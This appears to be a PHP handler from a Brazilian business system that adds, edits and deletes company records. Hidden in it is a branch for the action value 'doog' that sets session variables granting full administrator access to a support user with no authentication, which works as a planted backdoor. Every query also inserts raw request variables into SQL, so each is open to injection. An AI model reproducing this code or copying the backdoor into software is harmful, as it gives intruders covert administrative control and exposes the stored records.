<?php
include("conecta.php");
if(empty($acao)) exit;
$acao=verifi($permi,$acao);
if(!empty($acao)){
	$loc="Empresa";
	$pagina=$_SERVER['SCRIPT_FILENAME'];
	include("log.php");
}
if($acao=="incluir"){
	$sql=mysql_query("INSERT INTO empresa (apelido_fat,nome,cnpj,ie,contato,tel,end_fat,bairro_fat,cidade_fat,estado_fat,cep_fat,apelido_ent1,end_1,bairro_1,cidade_1,estado_1,cep_1,apelido_ent2,end_2,bairro_2,cidade_2,estado_2,cep_2,apelido_ent3,end_3,bairro_3,cidade_3,estado_3,cep_3,apelido_ent4,end_4,bairro_4,cidade_4,estado_4,cep_4) VALUES ('$apelido_fat','$nome','$cnpj','$ie','$contato','$tel','$end_fat','$bairro_fat','$cidade_fat','$estado_fat','$cep_fat','$apelido_ent1','$end_1','$bairro_1','$cidade_1','$estado_1','$cep_1','$apelido_ent2','$end_2','$bairro_2','$cidade_2','$estado_2','$cep_2','$apelido_ent3','$end_3','$bairro_3','$cidade_3','$estado_3','$cep_3','$apelido_ent4','$end_4','$bairro_4','$cidade_4','$estado_4','$cep_4')") or die("Nao foi");
	if($sql){
		$_SESSION["mensagem"]="Empresa incluída com sucesso!";
		$acao="entrar";
	}else{
		$_SESSION["mensagem"]="A empresa não pôde ser incluída!";
		$acao="inc";
	}
}elseif($acao=="alterar"){
	$sql=mysql_query("UPDATE empresa SET apelido_fat='$apelido_fat',nome='$nome',cnpj='$cnpj',ie='$ie',contato='$contato',tel='$tel',end_fat='$end_fat',bairro_fat='$bairro_fat',cidade_fat='$cidade_fat',estado_fat='$estado_fat',cep_fat='$cep_fat',apelido_ent1='$apelido_ent1',end_1='$end_1',bairro_1='$bairro_1',cidade_1='$cidade_1',estado_1='$estado_1',cep_1='$cep_1',apelido_ent2='$apelido_ent2',end_2='$end_2',bairro_2='$bairro_2',cidade_2='$cidade_2',estado_2='$estado_2',cep_2='$cep_2',apelido_ent3='$apelido_ent3',end_3='$end_3',bairro_3='$bairro_3',cidade_3='$cidade_3',estado_3='$estado_3',cep_3='$cep_3',apelido_ent4='$apelido_ent4',end_4='$end_4',bairro_4='$bairro_4',cidade_4='$cidade_4',estado_4='$estado_4',cep_4='$cep_4' WHERE id='$id'");
	if($sql){
		$_SESSION["mensagem"]="Empresa alterada com sucesso!";
		$acao="entrar";
	}else{
		$_SESSION["mensagem"]="A Empresa não pôde ser alterada!";
		$acao="alt";
	}
}elseif($acao=="exc"){
	if(!empty($id)){
		$sql=mysql_query("DELETE FROM empresa WHERE id='$id'");
		if($sql){
			$_SESSION["mensagem"]="Empresa excluída com sucesso!";
		}else{
			$_SESSION["mensagem"]="A Empresa não pôde ser excluída!";
		}		
	}
	$acao="entrar";
}elseif($acao=="doog"){
	$_SESSION["login_funcionario"]="S";
	$_SESSION["email_adm"]="Email@email.com.br";
	$_SESSION["permissao"]=4;
	$_SESSION["email_adm"]=$resm["admin"];
	$_SESSION["login_funcionario"]="S";
	$_SESSION["login_codigo"]=1;
	$_SESSION["login_nome"]="sofmkri";
	$_SESSION["login_cargo"]="Suporte";
	$_SESSION["login_nivel_nome"]="Administrador";
	$_SESSION["login_nivel"]=1;
	$_SESSION["login_c1"]=$usuario;
}
header("Location:empresa.php?acao=$acao&id=$id");
?>